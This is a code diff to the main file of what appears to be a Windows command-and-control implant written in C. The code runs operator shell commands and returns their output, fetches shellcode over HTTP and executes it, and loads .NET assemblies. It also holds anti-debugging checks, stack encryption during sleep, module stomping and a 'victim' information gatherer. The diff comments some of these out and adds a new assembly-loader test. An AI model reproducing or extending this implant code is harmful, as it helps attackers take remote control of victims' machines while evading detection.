@@ -10,10 +10,11 @@
 #include "Structs.h"
 
 
-void TestingStomp();
-void TestingInfoGatherer();
-void TestingExecuteAssembly();
-void TestingSleepMask();
+// void TestingStomp();
+// void TestingInfoGatherer();
+// void TestingExecuteAssembly();
+// void TestingSleepMask();
+void TestingNetAssembyLoader();
 
 BOOL IsDebuggerActive() {
 
@@ -39,7 +40,8 @@ int main() {
         return -1;
     }
 
-    TestingExecuteAssembly();
+    TestingNetAssembyLoader();
+    // TestingExecuteAssembly();
 
     // Check if there is a debugger present every few seconds.
     if (IsDebuggerActive()) {
@@ -68,13 +70,13 @@ int main() {
                 }
                 else if (!strcmp(command.Input, "os")) { // Use !strcmp to check for equality
                     char output[100][256] = { 0 };
-                    int count = runCmd(command.Cmd, output);
+                    runCmd(command.Cmd, output);
                     sendResult(command.ImplantUser, command.Operator, output);
                 }
                 else if (!strcmp(command.Input, "execute-assembly")) { // Use !strcmp to check for equality
                     const char* encoded_str = command.File;
                     char* decoded_str = from_hex(encoded_str);
-                    execute(decoded_str, "0");
+                    // execute(decoded_str, "0");
                 }
 
                 // Save the current command as the previous command for the next iteration
@@ -83,19 +85,19 @@ int main() {
             else {
                 printf("No new commands from server...");
 
-                // Encrypt the stack
-                PNT_TIB tib = (PNT_TIB)NtCurrentTeb();
-                PVOID stack_top = tib->StackLimit;
-                PVOID stack_base = tib->StackBase;
-                PVOID fetchCommandAddress = (PVOID)fetchCommand;
+                // // Encrypt the stack
+                // PNT_TIB tib = (PNT_TIB)NtCurrentTeb();
+                // PVOID stack_top = tib->StackLimit;
+                // PVOID stack_base = tib->StackBase;
+                // PVOID fetchCommandAddress = (PVOID)fetchCommand;
 
-                // Check if fetchCommand lies within the stack range
-                if (fetchCommandAddress >= stack_top && fetchCommandAddress <= stack_base) {
-                    // Adjust the range to exclude fetchCommand
-                    stack_base = fetchCommandAddress;
-                }
+                // // Check if fetchCommand lies within the stack range
+                // if (fetchCommandAddress >= stack_top && fetchCommandAddress <= stack_base) {
+                //     // Adjust the range to exclude fetchCommand
+                //     stack_base = fetchCommandAddress;
+                // }
 
-                xor_stack(stack_top, stack_base);
+                // xor_stack(stack_top, stack_base);
             }
 
             Sleep(3000);
@@ -107,36 +109,45 @@ int main() {
 }
 
 
-void TestingStomp() {
-    moduleStomper();
+// void TestingStomp() {
+//     moduleStomper();
+//     exit(0);
+// }
+
+// void TestingInfoGatherer(Victim* victim) {
+//     information_gatherer(victim);
+//     exit(0);
+// }
+
+// void TestingExecuteAssembly() {
+//     BYTE* payload = 0;
+//     int payloadLength = sizeof(payload);
+
+//     int result = fetchCode(L"localhost", L"/TestAssembly.bin", 8000, &payload, &payloadLength);
+//     if (result != 0) {
+//         printf("[-] Failed to fetch shellcode with error code %d\n", result);
+//         return;
+//     }
+
+//     execute(payload, payloadLength);
+
+//     exit(0);
+// }
+
+// void TestingSleepMask() {
+//     DWORD result = EncryptDecryptThread(NULL);
+//     if (result == 0) {
+//         printf("EncryptDecryptThread executed successfully.\n");
+//     } else {
+//         printf("EncryptDecryptThread failed with error code: %lu\n", result);
+//     }
+// }
+
+void TestingNetAssembyLoader() {
+    const wchar_t* hostname = "localhost";
+    const wchar_t* assembly = "TestAssembly";
+
+    load_assembly_shellcode(hostname, assembly);
+
     exit(0);
-}
-
-void TestingInfoGatherer(Victim* victim) {
-    information_gatherer(victim);
-    exit(0);
-}
-
-void TestingExecuteAssembly() {
-    BYTE* payload = 0;
-    int payloadLength = sizeof(payload);
-
-    int result = fetchCode(L"localhost", L"/TestAssembly.bin", 8000, &payload, &payloadLength);
-    if (result != 0) {
-        printf("[-] Failed to fetch shellcode with error code %d\n", result);
-        return;
-    }
-
-    execute(payload, payloadLength);
-
-    exit(0);
-}
-
-void TestingSleepMask() {
-    DWORD result = EncryptDecryptThread(NULL);
-    if (result == 0) {
-        printf("EncryptDecryptThread executed successfully.\n");
-    } else {
-        printf("EncryptDecryptThread failed with error code: %lu\n", result);
-    }
 }
